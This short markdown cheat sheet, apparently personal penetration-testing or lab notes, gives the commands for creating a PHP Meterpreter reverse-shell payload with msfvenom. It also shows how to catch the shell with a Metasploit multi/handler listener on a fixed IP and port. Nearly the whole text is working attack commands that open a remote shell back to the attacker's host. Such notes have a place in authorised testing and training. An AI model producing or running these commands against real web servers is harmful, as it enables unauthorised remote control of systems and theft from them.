
## Create a shell

> sudo msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.15.73 LPORT=4444 -f raw > /home/kali/msfshelly.php



## Receive a reverse shell

> msfconsole 

```
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 10.10.15.73
set lport 4444
run 
```
